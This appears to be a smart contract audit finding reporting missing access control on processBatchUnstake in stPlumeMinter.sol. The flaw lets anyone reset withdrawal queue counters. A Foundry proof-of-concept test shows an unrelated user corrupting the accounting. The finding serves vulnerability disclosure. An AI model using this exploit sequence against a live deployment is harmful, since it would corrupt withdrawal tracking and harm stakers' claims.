...
|[M-03](#m-03-lack-of-access-control-in-`processbatchUnstake`-causes-premature-`totalQueuedWithdrawalsPerValidator`-reset-leading-to-state-corruption)|Lack of access control in `processBatchUnstake` causes premature `totalQueuedWithdrawalsPerValidator` reset leading to state corruption in `stPlumeMinter.sol`. |MEDIUM|
...
## [M-03] Lack of access control in `processBatchUnstake` causes premature `totalQueuedWithdrawalsPerValidator` reset leading to state corruption in `stPlumeMinter.sol`.

## Description

The `processBatchUnstake()` function lacks access control, allowing anyone to call it and reset global withdrawal queue counters without updating individual user withdrawal requests, creating state inconsistencies.

This vul is severe when there are existing queued withdrawals, we can't guarantee this assumed behaivour, so it is in the best practice to provide access control here so as to avoid issues. Because, when there are queued withdrawals, this because a problem. 

## Root cause

```solidity
function processBatchUnstake() external { // Audit <-------- No access control
    // ... resets totalQueuedWithdrawalsPerValidator[validatorId] = 0
    // ... but doesn't update user withdrawalRequests
}
```
- The function:
1. Has no access control modifiers
2. Resets `totalQueuedWithdrawalsPerValidator[validatorId] = 0`
3. Doesn't synchronize individual withdrawalRequests[user][id]
4. Creates mismatch between global tracking and user state. 

## Impacts

1. New unstakes build from 0 instead of actual 125 ETH baseline according to my poc.
2. After the premature reset: it leads to the following issues:- 
a. Validator Capacity Miscalculation:- When reset to 0, `remainingUnstaked` shows full validator capacity instead of actual remaining capacity which causes over-allocation.

```solidity
uint256 remainingUnstaked = validatorStakedAmount - totalQueuedWithdrawalsPerValidator[_validatorId];
```

b. Over-inflated `remainingUnstaked` allows unstaking beyond validator's actual capacity. It would cause over-queuing.
...
c. Wrong `remainingUnstaked` leads to incorrect allocation decisions. 
```solidity
uint256 unstakeAmountFromValidator = remainingToUnstake > remainingUnstaked ? remainingUnstaked : remainingToUnstake;
```

d.  After reset, queue must rebuild from 0 to reach 100,000 ETH threshold, Delaying batch processing for legitimate users.
...
## Proof of code:
- Create a file and add this code to it;
...
contract StPlumeMinterForkTestMain is Test {
    ...
    function test_processBatchUnstake_state_inconsistency_poc() public {
        // === SETUP: Legitimate users stake and unstake ===
        vm.startPrank(user1);
        minter.submit{value: 100 ether}();
        frxETHToken.approve(address(minter), 100 ether);
        minter.unstake(50 ether); // User1 unstakes 50 ETH
        vm.stopPrank();
        
        vm.startPrank(user2);
        minter.submit{value: 100 ether}();
        frxETHToken.approve(address(minter), 100 ether);
        minter.unstake(75 ether); // User2 unstakes 75 ETH
        vm.stopPrank();
        
        // === STEP 1: Document legitimate state ===
        uint256 initialQueuedAmount = minter.totalQueuedWithdrawalsPerValidator(1);
        uint256 initialNextBatchTime = minter.nextBatchUnstakeTimePerValidator(1);
        
        // Verify legitimate accounting is correct
        assertEq(initialQueuedAmount, 125 ether, "Initial: Global queue tracks 125 ETH");
        
        // Get user withdrawal request timestamps  
        (, , uint256 user1WithdrawTime,) = minter.withdrawalRequests(user1, 0);
        (, , uint256 user2WithdrawTime,) = minter.withdrawalRequests(user2, 0);
        assertTrue(user1WithdrawTime > 0, "Initial: User1 has valid withdrawal request");
        assertTrue(user2WithdrawTime > 0, "Initial: User2 has valid withdrawal request");
        
        // === STEP 2: EXPLOIT - Lack of access control allows state corruption ===
        // Fast forward to make the time condition TRUE (legitimate processing window)
        vm.warp(initialNextBatchTime + 1 hours);
        
        // VULNERABILITY: No access control - anyone can call this critical function
        vm.prank(user3); // Unrelated user with no stake in the protocol
        minter.processBatchUnstake(); // Corrupts global state without user consent
        
        // === STEP 3: Document the state inconsistencies ===
        uint256 corruptedQueuedAmount = minter.totalQueuedWithdrawalsPerValidator(1);
        
        // STATE INCONSISTENCY 1: Global queue counter reset to 0
        assertEq(corruptedQueuedAmount, 0, "CORRUPTED: Global queue reset to 0 ETH");
        
        // STATE INCONSISTENCY 2: User withdrawal requests still exist
        (, , uint256 user1WithdrawTimeAfter,) = minter.withdrawalRequests(user1, 0);
        (, , uint256 user2WithdrawTimeAfter,) = minter.withdrawalRequests(user2, 0);
        
        assertEq(user1WithdrawTimeAfter, user1WithdrawTime, "INCONSISTENT: User1 request still exists");
        assertEq(user2WithdrawTimeAfter, user2WithdrawTime, "INCONSISTENT: User2 request still exists");
        
        // === STEP 4: Demonstrate the accounting corruption with new operations ===
        vm.startPrank(user3);
        minter.submit{value: 50 ether}();
        frxETHToken.approve(address(minter), 50 ether);
        minter.unstake(25 ether); // New unstake after corruption
        vm.stopPrank();
        
        uint256 newQueuedAmount = minter.totalQueuedWithdrawalsPerValidator(1);
        
        // CRITICAL STATE CORRUPTION: System only tracks new unstakes, "forgets" existing claims
        assertEq(newQueuedAmount, 25 ether, "CORRUPTED: System only sees new 25 ETH");
        // System should track 150 ETH total (125 ETH existing + 25 ETH new)
        // But only tracks 25 ETH = 125 ETH in user claims are "invisible"
    }
}
```
